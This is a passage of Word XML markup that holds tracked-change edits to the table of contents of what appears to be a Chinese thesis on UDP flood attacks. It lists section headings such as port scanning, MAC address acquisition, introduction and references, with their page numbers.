              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>6.3.3</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MAC地址获取</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>48</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5780D589" w14:textId="54AE880B" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="555" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="556" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="557" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="558" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>6.3.4</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端口扫描</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>48</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="048CC8E8" w14:textId="23F11737" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:ins w:id="559" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="560" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="561" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="562" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>6.3.5</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UDP Flood攻击</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>49</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2804217B" w14:textId="48E9B8AB" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:ins w:id="563" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="564" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="565" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="566" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>6.4</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:noProof/>
              <w:sz w:val="21"/>
              <w:szCs w:val="22"/>
            </w:rPr>
            <w:tab/>
          </w:r>
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>本章小结</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>50</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4185442D" w14:textId="60A78205" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="567" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="568" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="569" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="570" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>结论</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>51</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="309539AE" w14:textId="67FA349B" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="571" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="572" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="573" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="574" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>致谢</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>52</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="67D29F0D" w14:textId="7FFB80EE" w:rsidR="007656A2" w:rsidDel="002C4A81" w:rsidRDefault="007656A2">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:ins w:id="575" w:author="李勇" w:date="2017-05-14T10:34:00Z"/>
          <w:del w:id="576" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="577" w:author="李勇" w:date="2017-05-14T10:34:00Z">
        <w:del w:id="578" w:author="yong li" w:date="2017-05-14T10:54:00Z">
          <w:r w:rsidRPr="002C4A81" w:rsidDel="002C4A81">
            <w:rPr>
              <w:rStyle w:val="a8"/>
              <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
              <w:b/>
              <w:noProof/>
            </w:rPr>
            <w:delText>参考文献</w:delText>
          </w:r>
          <w:r w:rsidDel="002C4A81">
            <w:rPr>
              <w:noProof/>
              <w:webHidden/>
            </w:rPr>
            <w:tab/>
            <w:delText>53</w:delText>
          </w:r>
        </w:del>
      </w:ins>
    </w:p>
    <w:p w14:paraId="41225833" w14:textId="40EFA910" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:del w:id="579" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="580" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="581" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>摘要</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>I</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5D9E6B93" w14:textId="5B309BF7" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:del w:id="582" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="583" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="584" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>Abstract</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>II</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2191D872" w14:textId="12542BFA" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="420"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:del w:id="585" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="586" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="587" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>1.</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="588" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>绪论</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>1</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7329526C" w14:textId="5128CB3E" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="589" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="590" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="591" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>1.1</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="592" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>课题背景</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>1</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="134BDE3E" w14:textId="1F1D4AE5" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="593" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="594" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="595" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>1.2</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:rPrChange w:id="596" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:hint="eastAsia"/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>课题发展状况</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>2</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="60999E4E" w14:textId="4E8915E4" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="597" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="598" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="599" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>1.3</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="600" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="黑体" w:hAnsi="黑体"/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>研究的目的</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>2</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="005AEF81" w14:textId="3D253885" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="601" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="602" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="603" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>1.4</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="604" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:ascii="黑体" w:hAnsi="黑体"/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>任务完成情况</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>2</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3BA2E12F" w14:textId="063BB0F6" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="420"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:rPr>
          <w:del w:id="605" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="606" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="607" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>2.</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="608" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>UDP Flood攻击相关理论</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>3</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="72A5A030" w14:textId="46F227C3" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="609" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="610" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="611" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>2.1</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="612" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
